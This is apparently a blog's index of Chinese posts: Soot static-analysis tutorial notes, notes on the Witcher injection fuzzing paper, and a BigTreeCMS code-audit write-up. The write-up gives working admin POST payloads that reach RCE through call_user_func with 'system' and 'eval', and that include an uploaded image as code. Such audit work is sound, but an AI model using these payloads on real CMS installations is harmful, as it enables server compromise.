是BodyTransformers（参见第6.1节），它收集某种类型的标记，并生成一个新的属性以输出到类文件。聚合器必须决定在哪里标记相关信息—例如，一个单元可能被转换成几个字节码指令，因此聚合器必须决定该单元上的注释应该引用哪一个。Soot为其内置标记提供了几个聚合器—比如FirstTagAggregator将标记与用其标记的第一条指令相关联. 一般来说，如果我们只使用内置标签，就不需要关注聚合器\n6.1 TransformersTransformers实际上并不是标记框架的一部分，但用于注释代码。一般来说，Transformers是将某个代码块转换为另一个代码块的对象。在Soot中有两种不同的Transformers：BodyTransformers 和 SceneTransformer 。它们被分别设计为在单个方法体上（即过程内）和整个应用（即过程间）作transformations。要实现一个transformer，需要继承其中一个上述的Transformers并提供internalTransform方法的实现\n一个示例：\nPackManager.v().getPack(&quot;jtp&quot;).add(new Transform(&quot;jtp.myAnalysis&quot;, new MyAnalysis()));PackManager.v().runPacks();System.out.println(Scene.v().getCallGraph().size());PackManager.v().writeOutput();//MyAnalysis.java文件public class MyAnalysis extends BodyTransformer&#123;  protected void internalTransform(final Body body,String phase, @SuppressWarnings(&quot;rawtypes&quot;)Map options)&#123;            for (SootClass c:Scene.v().getApplicationClasses()) &#123;          System.out.println(&quot;[sootClass]&quot;+c);        for(SootMethod m:c.getMethods())        &#123;              System.out.println(&quot;[sootMethod]&quot;+m);            if(m.isConcrete())            &#123;                Body b=m.retrieveActiveBody();                  System.out.println(&quot;[body]&quot;+b);                Iterator&lt;Unit&gt; i=b.getUnits().snapshotIterator();                while(i.hasNext())                &#123;                    Unit u=i.next();                &#125;            &#125;        &#125;    &#125;  &#125;&#125;\n6.2 Annotating very-busy expressions让我们看看如何使用这种标记机制将运行活跃表达式分析的结果可视化地传达给用户。由于我们的示例是过程内分析，为了使用结果标记代码，我们继承BodyTransformer并实现了它的internalTransform方法。我们要做的就是为每个流出活跃表达式的单元作StringTags标记。此外，我们还希望对持续保持活跃的表达式作ColorTag标记。有了这些信息，用户可以很容易地看到活跃表达式通过他的方法，并快速识别到哪里可以优化。此过程的伪代码如下所示（有关完整详细信息，请参阅示例源代码）：\n\n为了将分析插入到Soot中，我们重写Soot的Main类，将我们的标签插入到Jimple转换包中（如第4节所述）。\n7 Call Graph ConstructionCallGraph构建\n前提：开启全局模式\nOptions.v().set_whole_program(true);PackManager.v().runPacks();\n在执行过程间分析时，应用程序的调用图是一个基本实体. 调用图可用时(仅在whole-program 模式)，它可以通过环境类（Scene）使用getCallGraph方法进行访问。CallGraph类和其他相关的构造类位于soot.jimple.toolkits.callgraph包中。最简单的调用图是通过 类层次分析（CHA）获得的，不需要进行设置。CHA很简单，因为它假设所有引用变量都可以指向正确类型的对象。以下是使用CHA获取调用图的示例：\n\n7.1 Call Graph RepresentationSoot中的调用图是表示所有已知方法调用边的集合，这里包括：\n\n显式方法调用\n静态初始值的隐式调用\nThread.run()的隐式调用\n常量类对象的隐式调用\nAccessController的隐式调用\n\n调用图中的每条边包含四个元素：源方法、源语句（如果适用）、目标方法和边的类型。不同种类的边例如用于静态调用、虚拟调用和接口调用。\n调用图具有查询进入函数边的方法，出函数边的方法以及来自特定语句的边的方法（分别对应edgesInto(method), edgesOutOf(method), edgesOutOf(statement)）。每一种方法都返回一个基于构建边的迭代器。Soot提供了三个所谓的适配器，用于在边的特定位置上迭代：\n\nSources 迭代源方法边\n\nUnits 迭代源语句边\n\nTargets 迭代目标方法边\n因此，为了遍历特定方法的所有可能调用它的方法，可以：\n\n\n\n7.2 More specific informationSoot还提供了另外两种构建，以更详细的方式查询调用图：ReachableMethods和TransitiveTargets\n\nReachableMethods：此对象跟踪哪些方法可从入口点访问，其中contains(method)测试指定方法是否可达，listener()方法返回一个迭代器遍历所有可访问的方法\nTransitiveTargets：对于迭代所有从特定方法调用的函数或者其调用的其他函数（遍历调用链）是很有用的，构造函数接收（除了调用图之外）一个可选的过滤器参数Filter，过滤器表示调用图中满足给定EdgePredicate（一个简单接口，有两个具体实现：ExplicitEdgesPred与InstanceInvokeEdgesPred）谓词的边集合\n\n8 Points-To Analysis在本节中，我们将介绍在Soot中进行指针分析的两个框架：SPARK和Paddle框架\n指针分析的目标是计算一个函数，该函数在给定变量的情况下返回可能的目标集，为了进行许多其它种类的分析，如别名分析，或者为了提高例如调用图的精度，从指向分析得到的集合是很有用的。\nSoot提供了PointsToAnalysis和PointsToSet接口，任何指针分析都应该实现这些接口。PointsToAnalysis接口包含reachingObjects（Local l）方法，该方法将l所指向的对象集作为PointsToSet返回。PointsToSet包含用于测试与其他PointsToSet的非空交集的方法，以及一个用于返回集合中对象的所有可能运行时类型的集合的方法。这些方法对于实现别名分析和virtual method调度非常有用。当前的 points-to 集合可以通过Scene.v().getPointsToAnalysis()方法获得。至于如何创建取决于所使用的接口实现。\nSoot提供了points-to接口的三种实现：CHA（dumb版本）、SPARK和Paddle。dumb版本只是假设每个变量都可能指向其他变量，这是保守合理的，但不是非常准确。然而，dump版的指针分析实现可能具有一些价值，例如创建不精确的调用图，该调用图可以用作例如指针分析的起始点，从该点分析可以构造更精确的调用图\nSPARK和Paddle框架以更复杂的设置和速度为代价提供更准确的分析，这两种算法都是基于子集的，如Anderson算法，而不是基于等价的Steensgaard算法。\n8.1 SPARKSPARK是一个用于在Java中试验指向分析的框架，它支持基于子集和基于等价的指向分析，以及介于两者之间的任何分析。SPARK是非常模块化的，这使得它非常适合于对不同的技术进行基准测试，以实现指针分析的各个部分。\n在本节中，我们将展示如何使用SPARK来设置和试验SPARK提供的基本指针分析。\nSPARK作为Soot框架的一部分提供，位于soot.jimple.spark中。*包中。作为SPARK的一部分，提供了一个指针分析，并且可以使用选项控制分析的细节。例如，传播算法可以是一个简单的迭代算法，也可以是一个更有效的worklist算法。\nUsing SPARKSPARK强大的模块性提供了一组丰富的选项，使得为任何对象设置SPARK都变得不那么容易。为了能够使用SPARK，我们建议使用Eclipse从示例源代码加载示例代码，或者创建一个新项目并将Jasmin、Polyglot和Soot jar文件添加到类路径中，在设置运行配置时，应该向JVM添加参数-Xmx512m来增加虚拟内存。\n接下来介绍一下待分析的实例方法，方法用到了Container类和它的内部类Item。Container类有一个私有属性和一对get/set方法，Item类有一个object类型的私有属性data。\ngo方法创建了两个Container类实例，并分别设置了Item类实例属性。此外第三个Container对象声明并被第二个Container对象的引用所赋值。\n\n\n\n我们希望在此示例上运行SPARK，并期望它发现c1的指针集不与c2或c3的指针集相交，而c2和c3应该共享相同的指针集。此外，我们期望在（1）和（2）处分配的Container对象的Item字段指向不同的对象i1和i2（上下文敏感）\n要运行SPARK，我们设置Soot Scene以加载Container和Item类以及包含go方法的类。使用Scene.v().loadClassAndSupport(name); 和c.setApplicationClass();\n\n设置SPARK的代码如下，其中我们列出了最有趣的选项，并展示了如何使用SparkTransformer类的transform方法，将选项maps作为参数来运行SPARK分析\n\n参数信息如下：\n\nverbose SPARK分析时输出日志信息\npropagator SPARK支持两种指针集传播算法，一种简单的迭代算法和一种更有效的基于worklist的算法\nsimple-edges-bidirectional 如果为真，此选项将使所有边双向，从而允许基于等效的指针分析，如Steensgaard算法\non-fly-cg 如果调用图是即时创建的，这通常给出更精确的分析点和生成的调用图\nset-impl 描述了指针集的实现，可能的值为散列、位、混合、数组和Double。散列的实现基于Java hash set。位是使用位向量实现的。Hybrid是一个集合，它保存最多16个元素的显式列表，并在集合变大时切换为位向量。数组是使用始终保持排序顺序的数组实现的。Double使用两个集合实现，一个用于尚未传播的新指向对象集合，另一个用于已传播且需要重新考虑的旧指向对象集合。\ndouble-set-old 和 double-set-new 描述了double实现中新的和旧的指向对象集的实现，并且double-set-old和double-set-new仅在double是set-impl的值时有效\n\n使用示例代码运行SPARK，得到的输出如下所示：\n\n左列中的数字表示变量初始化点，比如[4,8] Container intersect? false 指的是在第4行初始化的变量c1和在第8行初始化的变量c2。右列说明两个变量的指向集是否有空交集（true表示有）\n首先，作为一个简单的一致性检查，我们看到每个变量都有一个指针集-与自身的交集，正如预期的那样，指向变量集c1和c2以及c1和c3的指针集不相交，而c2和c3的指向集合相交。\n至于item字段，我们看到所有指向集合都彼此相交，即使它们属于不同的Container对象。结果与我们的期望之间的这种不匹配的原因是我们期望中的错误。我们希望SPARK能够区分两次setItem调用，但是SPARK对上下文不敏感，因此只分析一次setItem方法，并合并每次调用setItem方法时的指向集。\nSPARK是一个大而健壮的框架，用于试验上下文不敏感指向分析的许多不同方面。我们只介绍了许多选项中的一小部分，还有更多的组合可用，您应该使用源代码示例来熟悉SPARK，并尝试一些此处未介绍的其他选项组合。\n8.2 PaddlePaddle是Soot的上下文敏感指向分析和调用图构造框架，使用二元决策图（BDD）实现。Paddle在上下文不敏感分析中的准确度与SPARK相当，但当前的实现非常缓慢，主要是由于组成实现的不同程序的拼凑在上下文敏感分析中也提供了非常好的准确度。BDD的使用保证了时间和空间方面的效率，特别是在大型程序上。因为BDD提供了比SPARK和其他框架中更紧凑的集合表示，当前的实现非常缓慢，主要是由于组成实现的不同程序的拼凑\nObtaining and setup of Paddle\nPaddle前端沿着Soot框架分发，为了避免在编译Soot时需要Jedd，“后端”是单独分发的。Paddle需要BDD实现和Jedd运行时环境才能运行，而这又需要Polyglot和SAT求解器。Jedd运行时提供了两个BDD实现：BuDDy（缺省）和CUDD BDD实现；也可以使用其他BDD实现，如JavaBDD和SableJBDD\n所有这些条件使得正确安装Paddle比较复杂，所以我们现在给予了一个彻底的展示如何安装Paddle\n\n下载最新的Paddle发行版，您应该使用夜间版本获取最新的更新和错误修复，夜间构建可从以下位置获得http://www.sable.mcgill.ca/~olhota/build/ \n下载zChaf SAT解算器 http://www.princeton.edu/~chaff/zchaff.html ，通过make all安装，确保程序zchaff和zverify df可由您执行\n\n\nUsing PaddlePaddle是一个用于上下文敏感指针分析的模块化框架，它允许对分析的各个组件进行基准测试，比如以上下文敏感的变化进行基准测试，使其成为一个非常有趣的工具。Paddle也是一种早期α-release，因此请注意Paddle的稳健性较差。\nPaddle配备了大量选项，可根据您的特定需求配置分析。使用Soot命令行工具可以获得选项的完整说明，\njava soot.Main -phase-help cg.paddle\nPaddle选项的指定类似于SPARK中使用选项名称和值的map，选项verbose、set-impl、double-set-new和double-set-old与SPARK中的相同。q选项确定队列的实现方式，并且enabled必须为true才能运行分析。propagator控制在将指针集进行传播时使用哪种传播算法，我们将其留给Paddle来选择并设置为auto。conf控制是即时还是提前创建调用图。Paddle的实现是基于子集的，但可通过将simple-edges-bidirectional选项设置为true来模拟基于等效的分析。最后四个选项是最重要的，所以我们描述一些细节：\n\nbdd：控制BDD是否启用\nbackend：控制BDD后端选项 (BuDDy), cudd (CUDD), sable (SableJBDD), javabdd(JavaBDD) or none\ncontext：控制分析中使用的上下文敏感程度。如果值设置为insens，则它的执行与SPARK框架执行上下文不敏感分析一样。1cfa Paddle执行1-cfa上下文相关分析。kcfa Paddle k-cfa执行上下文相关的，其中k是使用k选项指定的(这里的k应该指的是上下文调用深度)。objsens和kobjsens使Paddle分别执行1-object-sensitive分析和k-object-sensitive敏感分析。uniqkobjsens使Paddle执行unique-k-object-sensitive分析。默认为insens\nk k选项指定用作上下文的调用链或receiver Object的最大长度当上下文选项的值是kcfa、kobjsens或uniqkobjsens之一时\n\n\nk-CFA上下文敏感分析基于作为上下文的调用点串，并且k描述的是调用串的最大长度。正常情况下调用点敏感分析运行良好，但如果添加了额外的间接层，例如同样的函数在setItem()方法中调用了，则仅依赖于调用点的上下文敏感分析将会合并对setItem方法的两个调用的 points-to-sets 集合，因为他们对同样的函数调用点一样。例如如下这种情况：\n\n通过使用一串调用点，我们能够区分对相同函数的两个调用，从而使 points-to-sets 集保持分离。程序中的调用链长度可以是任意大的，因此我们需要将长度固定为k —因此使用了 k-cfa\n下面测试一下利用 Paddle 的上下文敏感分析是否能推断出作为第4行声明的Container变量创建的item字段不与任何其他item字段共享 points-to 集。当设置选项为 1-cfa 时，Container.item变量的信息也与SPARK示例相同，这不是我们所期望的。\n出现此意外行为的原因是以下行：\nprivate Item item = new Item();\n这条语句位于 Container 类中，Paddle默认不使用上下文敏感的堆抽象，因此每个容器对象的item字段都使用相同的堆抽象表示的。如果我们将这行语句改成private Item item; 则容器的item字段不指向同一个抽象对象，并且在新的Container类上运行Paddle会产生预期的结果(如下所示)\n\n获得正确结果的另一种方法是启动上下文相关的堆抽象选项 opt.put(&quot;context-heap&quot;,&quot;true&quot;); 这使得 Paddle 能够区分分配给不同 Container 类的 Items 字段。\n8.3 What to do with the points-to sets?在最后两个小节中，我们详细描述了如何使用SPARK和Paddle指向分析框架，通过上下文不敏感或上下文敏感分析获得给定程序中变量的指向集。我们看到设置这两个框架相当复杂，因此这里需要阐明一下原因。\n为了在许多分析和变换中获得精度，指向（或别名）信息是必需的。例如，精确的指向分析可用于获得精确的空指针分析结果或更精确的调用图，这又可导致其它分析中的更精确。精确的指向信息对于以下各项的准确性也至关重要，比如命令式和面向对象语言的部分求值。\n9 Extracting Abstract Control-Flow Graphs !!在本节中，我们将展示如何使用Soot提取抽象控制流图的自定义中间表示IR，该中间表示可用作您自己的分析和转换的起点\n抽象控制流图捕获控制流的相关部分，并抽象掉不相关的部分。为了获得易于处理但又足够的表示来实施分析，通常需要去除不相关的部分。\n一个很好的例子是Java字符串分析（JSA），其中跟踪和分析了Java字符串上的各种操作，如拼接。在 JSA 中，只有与控制流相关的字符串是待分析的部分，因此，在抽象期间控制流的其他部分被移除。同时分析基于抽象表示。\n\n我们将使用上图所示的Foo类，它有一个操作对象状态的方法foo方法（可以是java.lang.String 的连接方法）。我们希望能够跟踪Foo对象在程序执行过程中是如何演变的，因此我们需要一个抽象的控制流图，它只关心与Foo对象有关的控制流部分。\n9.1 The Abstract Foo Control-flow Graph抽象Foo控制流图是对与Foo程序相关的控制流的描述。我们将控制流图表示为Java的一个非常小的子集，称之为Foo中间表示，如下图中的BNF所述。Foo中间表示仅包含六种不同的语句和三种类型，因此非常紧凑和易于管理。Foo 程序的中间表示是由一系列方法构成，其中包含图示中由 BNF 描述的语句，其中f的范围是Foo类型的标识符，m的范围是方法名，int是Java整数类型，τ是Foo类型或任何其他类型。\n\n这六种语句为：Foo对象的初始化、对Foo类的foo方法的方法调用、调用其他方法并返回其他类型、方法调用foo以外的其他方法，返回类型等于Foo，最后是 nop 语句。\n图中可以看到语句与执行行为的映射，与预期一致。Foo对象的实例化映射到Foo初始化。对foo方法的方法调用映射到Foo方法调用，Foo类型的赋值语句转换为Foo赋值语句。foo方法以外的方法调用分别转换为具有或不具有Foo返回类型的方法调用。在中间表示中，我们将非Foo对象实例化视为某个方法调用，它恰好是对构造函数方法的调用，我们将对Foo的强制转换视为某个方法调用，Foo作为返回类型。为了简洁起见，我们完全忽略了控制结构和异常，任何基于这种抽象表示的分析对于抛出异常的程序都是非sound的，因为异常可能会影响Foo对象的值\n9.2 Implementation实现从Java到Foo中间表示的转换包括两个步骤：首先实现Foo中间表示，然后实现Java和中间表示之间的转换。\nFoo中间表示的实现非常直接，每种语句都继承了Statement类，该类提供了成为控制流图中的节点所需的一些常规功能，比如：存储前导语句和后继语句的集合。\n代码被组织在 dk.brics.soot.intermediate 包的五个子包中。main子包包含主程序（Main.java），它使用转换来显示 foo 子包中的测试程序 FooTest.java 抽象控制流图的文本表示，这将作为运行或检查代码时的起点。在foo子包中，可以找到如上所述的Foo类。在表示子包中，可以找到中间表示的实现以及一些用于变量和方法的附加类。此外，还提供了一个访问者（StatementProcessor.java）来遍历语句（访问者模式）。在子包 foonalasys 中，可以找到类Foonalasys，它是基于中间表示上执行分析的表示，因此 Foonalasys 首先需要实例化并运行从Java到Foo中间表示的转换。 translation 类位于 translation 子包中。在这里，您将找到负责translation 的三个类：JavaTranslator, StmtTranslator, and ExprTranslator。\n从 Java 的转换是通过 Jimple 完成的，因此转换需要理解清 Jimple 以及各种 Java 构造是如何映射到 Jimple 的，以便在从 Jimple 转换到 Foo 中间表示时识别它们。比如对象创建和初始化是在Java中的一个 new 表达式中完成的，但是在 Jimple 中已经像在Java字节码那样被分离成了两个构造，因此在从Jimple到Foo中间表示的转换中必须小心处理这一点。\nSoot为 translation 提供了基础架构，特别是 AbstractStmtSwitch 和soot.jimple.AbstractJimpleValueSwitch 类非常有用。AbstractStmtSwitch 是一个抽象访问器，它为 Java（Soot）中可用的不同类型的语句提供方法（操作）。类似地，soot.jimple.AbstractJimpleValueSwitch 是一个抽象访问器，它为不同的 Jimple 值（如virtualInvoke、specialInvoke 和 add 表达式）提供方法（操作）。\ntranslation 由三个类来实现：JavaTranslator、StmtTranslator 和 ExprTranslator。JavaTranslator 类负责翻译给定 Java 程序的各种方法，并将翻译后的语句连接在一起。JavaTranslator维护一个在 makeMethod 方法中初始化的方法数组。translate方法主要来完成实际翻译和已翻译语句的链接。\n使用继承 AbstractStmtSwitch 类的 StmtTranslator 类转换各个语句。根据我们的经验，我们在StmtTranslator中使用的子集应该足以满足大多数用途。StmtTranslator的主要方法是translateStmt 方法，它将 StmtTranslator 应用于语句，并维护从 Soot 语句到 Foo 表示中相应代码的第一个语句的映射。这个 map 便于报告错误。此外，StmtTranslator还有一个方法addStatement，它将给定的 Foo 语句添加到正确的方法中，并维护对第一个语句的引用。addStatement 方法用于在翻译期间添加语句。\n子表达式使用 ExprTranslator 进行转换，ExprTranslator 是soot.jimple.AbstractJimpleValueSwitch 类的扩展，因此会覆盖许多方法以实现转换。入口点是 translateExpr 方法，该方法基本上将 ExprTranslator 应用于给定的 ValueBox。我们只实现了运行示例所需的方法，因为我们的目标只是介绍如何创建抽象控制流图。指的注意的方法是caseSpecialInvokeExpr 和 handleCall 方法。caseSpecialInvokeExpr 方法检验我们是否正在处理 Foo 对象的初始化操作，如果是的话则创建一个 Foo 初始化语句，否则则它只是某个其他方法调用，执行 handleCall 方法。在这一点上，源代码与上面描述的表示不同，在源代码中，我们不区分这两种其他方法调用。\nConcluding\nSoot为创建自己的抽象控制流图提供了一些支持，但是Java是一种大型语言，在实现从Jimple到自己的表示的转换时，必须考虑许多不同的方面。此外，您必须弄清楚Java构造如何映射到Jimple，然后Jimple构造应该如何映射到您的表示。但是除此之外，两个抽象类AbstractStmtSwitch和soot.jimple.AbstractJimpleValueSwitch为翻译提供了很好的起点，并且工作得很好。\n","tags":["静态分析"]},{"title":"《Toss a Fault to Your Witcher - Applying Grey-box Coverage Guided Mutational Fuzzing to Detect SQL and Command Injection Vulnerabilities》论文笔记","url":"/2023/03/14/Toss%20a%20Fault%20to%20Your%20Witcher%20Applying%20Grey-box%20Coverage%20Guided%20Mutational%20Fuzzing%20to%20Detect%20SQL%20and%20Command%20Injection%20V/","content":"Toss a Fault to Your Witcher: Applying Grey-box Coverage Guided Mutational Fuzzing to Detect SQL and Command Injection VulnerabilitiesGrey-box / Coverage Guided / Mutational Fuzzing\n\n概要\n​        黑盒 web 应用漏洞扫描器试图在不访问源代码的情况下自动识别 web 应用中的漏洞。然而，他们通过使用人工管理的易受攻击的输入列表（POC）来实现这一点，这显著降低了黑盒扫描器探索 web 应用的输入空间的能力，并且这可能导致漏报。此外，黑盒扫描程序必须尝试推断触发了漏洞，这会导致误报。\n​        为了克服这些限制，受到灰盒覆盖引导 Fuzzing 的启发，提出新型 web 漏洞检索框架——Witcher. Witcher 实现了 fault escalation 的概念，可用来检测 SQL 和 命令注入漏洞。\n​        另外，Witcher 会捕获代码覆盖信息并且创建了以输出派生的输入指导来注重输入的生成，进而增加对 web 应用状态空间的探索。通过实验，Witcher 无论是在发现的漏洞数量方面，还是在 Web 应用程序的代码覆盖率方面，都优于最先进的扫描程序\n1. Introduction​        前人的一些漏洞自动化检测工作主要分为白盒、黑盒和灰盒三种技术，主要受制于应用的语言、漏洞类型和输入。\n\n白盒：首先要拿到源码，其次对特定语言进行具体建模。不适于新的语言和框架\n\n\n黑盒：通过输入 POC 来推断漏洞的存在性（预配置），也就是使用的硬编码形式的诱导输入，这将会减少探索 web 应用输入空间的能力，产生漏报。其次，仅通过输出响应来推断是否触发漏洞将会产生误报\n\n\n灰盒：使用覆盖信息来指导输入的生成。它模糊了白盒以及黑盒的界限，其使用强度较低的静态或动态分析形式\n现有技术缺点在于：仅针对单一语言、无法检测 SQL 注入或命令执行漏洞、闭源系统并且性能相对低下\n\n\n\n本文思想：通过使用代码覆盖信息来有效地引导随机输入的生成，来探索 web 应用的输入空间（而不仅仅依赖于硬编码（POC）的试探法），很像有限自动状态机\n\n挑战：我们所关注的 web 应用代码也就是被测目标只是整个执行对象的一部分，这将会导致灰盒 Fuzz 受到其他部分如代码执行环境（解释器或虚拟机）的干扰\n\n支持 Web 应用的自动化 Fuzzing\n\n\n\n\n如何检测 SQL 和命令执行漏洞是否被触发？\n如何生成有效的输入（语法和语义都合理）进行 Fuzz？HTTP请求格式 / 参数名\n\n\nWeb 注入漏洞的增强\n\n\n如何收集 web 应用的代码覆盖信息（可扩展且具有独立性）？传统插桩会受到解释器代码的干扰\n如何设计一个高效的输入变异策略来增加 fuzz 的有效性？传统的策略并未利用客户端提供的上下文信息\n\n\n\n贡献：\n\n创造了一系列技术来处理在 web 应用使用灰盒覆盖引导 fuzz 的挑战，并给出了框架\n开发 Witcher fuzz 工具，可以自动化分析服务器端二进制程序和解释型语言编写的 Web 应用程序来检测 SQL 注入、命令执行和内存中断漏洞（仅针对基于C的 CGI 二进制文件）\n通过不同方面开展实验评估\n\n\n\n2. Coverage-Guided Fuzzing思想：将输入种子置于测试用例队列，并根据不同的变异策略产生新的输入加入到队列中。覆盖引导式的变异策略会利用代码覆盖信息来近似程序执行的状态（覆盖信息可通过静态或动态技术来获得），进而指导测试输入的选择。当输入使得程序到达一个新的状态或者导致错误信号响应，则会对该输入进行标记\n3. Witcher’s Design实现组件 Fault Escalator / HTTP Harness / Request Crawler 以支持 web 注入漏洞 fuzz；实现组件 Request Crawler / Request Crawler 以增强 web 注入漏洞 fuzz\n\n\nFault Escalator\n类似于二进制 fuzzers 通过检测 segmentation fault 信号来判断漏洞状态，Witcher 利用的是语法错误来判断 SQL 注入：如果攻击者控制的输入导致外部解析器中出现语法错误，则攻击者可以更改命令，很可能存在可利用的漏洞，在实现上 LD_PRELOAD 模块来 hook libc 库中的 recv 函数。对于命令执行漏洞，直接用的 dash 命令行解析器（增强解析错误）。当错误发生时，Fault Escalator 就会将其提升为 segmentation fault，指示当前测试输入导致了程序进入漏洞状态。进一步通过判断是否可被利用来验证是漏洞还是 bug\n\n\nRequest Crawler\nReqrle 类似黑盒扫描的爬虫，给定入口 URL 或者可选的登录凭据参数，利用 [Puppeteer][https://github.com/puppeteer/puppeteer] 来模拟用户的行为并捕获请求。首先是静态分析渲染出的 HTTP 页面，识别每一个创建 HTTP 请求或者参数的元素；然后利用测试工具 Gremlins 系统、随机地模拟用户事件并监听 HTTP 请求\n\n\nRequest Harnesses\n会将 fuzzer 生成的输入转换成合法的请求，对于 PHP 和 CGI 脚本编写的 web 应用转换成 CGI 请求；对于 Python \\ Node.js \\ Java \\ 基于 QEMU 的二进制文件转换成 HTTP 请求。\n\nCGI Harness\n使用 LD_PRELOAD 来创建一个分支服务器，在处理输入之前启动解释器或二进制文件。harness 将会接收每一个新输入，将其转换为 CGI 请求并传给新创建的子进程。\n\nHTTP Request Harness\n将目标平台与 fuzzer 分离，使得能够在它不自动支持的应用程序上工作\n\n\n特点：对每个 fuzzer 实例都会保持请求路径，意味着一次只会 fuzz 单一的 URL\n\n\nCoverage Accountant\n并未采用传统针对解释器插桩的技术，因为这将会产生大量噪声。Coverage Accountant 置于解释器中，调用并覆盖库函数。其会接收行号、字节码以及当前字节码的执行参数并利用它们来更新 fuzzer 的覆盖信息。对于 CGI 二进制文件，如果二进制源码可得就用 AFL 插桩，否则通过 QEMU 动态插桩。除此之外，Witcher 支持与更先进的 fuzzer 进行结合\n\n\nHTTP-specific Input Mutations\n在 AFL 的基础上添加了两个变异阶段，来重点操作 HTTP 参数。\nHTTP Parameter Mutator：对 fuzzer 的队列中的测试样本随机搭配参数名和值（进而产生新的测试输入），由于不同样本参数之间的相关性。这种策略能提供比随机字节变异更可能触发新的执行路径的目标测试输入\nHTTP Dictionary Mutator：这里是考虑了一个应用节点可能有多个使用不同 HTTP 变量的请求。首先将 Reqr 模块获得的 HTTP 参数放入 fuzz 字典，随机选择1到10个变量并加入到当前测试输入中，以利用相似性变量匹配尽可能匹配当前请求。这样减少了当前输入与字典中的变量配对所需的执行次数\n\n\n\n缺陷：\n\n能探测的漏洞类型有限，可以进一步探索文件包含、目录穿越以及 XSS\n\n无法检测二次注入类型的漏洞，因为无法判断对应的输入是什么\n原因：没有维护应用程序的状态，只能通过应用程序数据库的状态\n\n\n","tags":["软件漏洞分析"]},{"title":"跟着Y4师傅学代码审计-BigTreeCMS","url":"/2022/12/16/TreeCMS%E5%88%86%E6%9E%90/","content":"写在前面这是代码审计练习的第八篇分析文章，最近看的CMS感觉难度上来了，很多WAF和复杂的嵌套比较吃力，慢慢来吧。这篇感觉bigtreecms的这个RCE很具有学习价值\n漏洞分析RCE\nexp\n__csrf_token_8RR12GMPJ6EHBQGB3VUL0BE6NHVDQAKC__=aUUlSjf%2BRjg1bh0IjKYGO%2F50CHlxHB4Wq1VVc3v2OUQ%3D&amp;id=RacerZ1&amp;name=RacerZ1&amp;type=list&amp;settings=&#123;&quot;list_type&quot;:&quot;static&quot;,&quot;allow-empty&quot;:&quot;Yes&quot;,&quot;list&quot;:&quot;whoami&quot;,&quot;pop-table&quot;:&quot;&quot;,&quot;parser&quot;:&quot;system&quot;&#125;&amp;description=&lt;p&gt;Test rce&lt;/p&gt;../../../../site/files/3.jpg\n\n__csrf_token_MRMF7MRPG9CQD453P0JB4CT4LQBR3RQJ__=CmxtdkAZ5T31L8IDY03W7AIrECu%2BkV3sqFzvepUNZh4%3D&amp;id=1&amp;name=12&amp;type=text&amp;settings=null&amp;description=1212\n定位路由 site/index.php/admin/developer/settings/create/对于的处理代码在core/admin/modules/developer/settings/create.php 注意token要及时更换。经过token鉴定之后跟入createSetting()\n\n这里可以看到会对POST传参的settings字段进行json解码\n\n\nsettings中的所有键值对均可控\n跟入BigTree::arrayFilterRecursive($settings)，这里会调用一个array_filter()方法，回调函数没写就是去掉数组中的空值，并返回过滤后的数组\n\n\n之后会将POST参数值中的id name description settings都插入到数据库当中，这里注意几个参数基本都没过滤。是否同样存在XSS一会儿检验一下\n\n之后访问Settings页面\n\n对应的访问路由 /site/index.php/admin/settings/edit/\n代码在core/admin/modules/settings/edit.php，首先会先拿数据库中的数据\n\n拿到的settings数组存入item变量当中\n\n之后会赋值对应的type和settings键值给field变量，进入BigTreeAdmin::drawField()方法\n\n这里回去拼接出来一个路径，其中type值是我们可以改的，我们设置成list是因为该php存在任意代码执行\n\n\n之后根据条件分支会include该php页面，进而跟入\n\n里面可以看到会先判断$field[&quot;settings&quot;][&quot;list_type&quot;]，这里我们设置成了static，因此会直接将$field[&quot;settings&quot;][&quot;list&quot;]中的值赋给list变量\n\n往下看到有个利用函数call_user_func()可以利用，且参数均可控。所以再将$field[&quot;settings&quot;][&quot;parser&quot;]设置成系统函数，便可达到调用命令执行。接下来看下回显点\n\n这里可以看到只要$field[&quot;settings&quot;][&quot;allow-empty&quot;] != &quot;No&quot;)满足条件（不确定，但是测试结果是这样），即可将执行结果方法回显至option标签处\n\n\n文件上传__csrf_token_8RR12GMPJ6EHBQGB3VUL0BE6NHVDQAKC__=aUUlSjf%2BRjg1bh0IjKYGO%2F50CHlxHB4Wq1VVc3v2OUQ%3D&amp;id=upload_img7&amp;name=upload_img7&amp;type=image&amp;settings=&#123;&quot;thumbnails&quot;:&#123;&quot;thumbnail&quot;:&#123;&quot;width&quot;: 5,&quot;height&quot;: 5, &quot;pop-table1&quot;: &quot;&quot;&#125;&#125;, &quot;pop-table2&quot;: &quot;&quot;, &quot;crops&quot;: &#123;&quot;crop&quot;: &#123;&quot;width&quot;: 5, &quot;height&quot;: 5, &quot;pop-table3&quot;: &quot;&quot;&#125;&#125;&#125;&amp;description=Upload_Img\n\n\n__csrf_token_XUGVJ45MM1WTTVVAENRUK85J00WV924R__=9yaM9zmpCkbY4M0BbiwQ%2F8vtlPSvhKrxzkOb%2FKqQqFk%3D&amp;id=last_chance1&amp;name=last_chance1&amp;type=list&amp;settings=&#123;&quot;list_type&quot;:&quot;static&quot;,&quot;allow-empty&quot;:&quot;Yes&quot;,&quot;list&quot;:&quot;include ./../../../site/files/3.jpg;&quot;,&quot;pop-table&quot;:&quot;&quot;,&quot;parser&quot;:&quot;eval&quot;&#125;&amp;description=&lt;p&gt;Test rce&lt;/p&gt;\n__csrf_token_XUGVJ45MM1WTTVVAENRUK85J00WV924R__=9yaM9zmpCkbY4M0BbiwQ%2F8vtlPSvhKrxzkOb%2FKqQqFk%3D&amp;id=upload_img7&amp;name=upload_img7&amp;type=image&amp;settings=&#123;&quot;thumbnails&quot;:&#123;&quot;thumbnail&quot;:&#123;&quot;width&quot;: 5,&quot;height&quot;: 5, &quot;pop-table1&quot;: &quot;&quot;&#125;&#125;, &quot;pop-table2&quot;: &quot;&quot;, &quot;crops&quot;: &#123;&quot;crop&quot;: &#123;&quot;width&quot;: 5, &quot;height&quot;: 5, &quot;pop-table3&quot;: &quot;&quot;&#125;&#125;&#125;&amp;description=Upload_Img\n","tags":["代码审计"]},{"title":"Yakit单兵作战武器文档速查","url":"/2023/01/12/Yakit/","content":"写在前面记录Yakit这个工具的使用学习以及Yakit语法脚本exp的编写，黑盒开搞！\nYak中的常见库使用教程\n字符串工具库 str\n渗透测试可能需要使用的函数\n\n判断一个字符串密码强弱\nprintln(str.IsStrongPassword(&quot;abcdefghijk&quot;))       // falseprintln(str.IsStrongPassword(&quot;abc#52G&quot;))           // falseprintln(str.IsStrongPassword(&quot;abcdefgh.G1ijk&quot;))    // 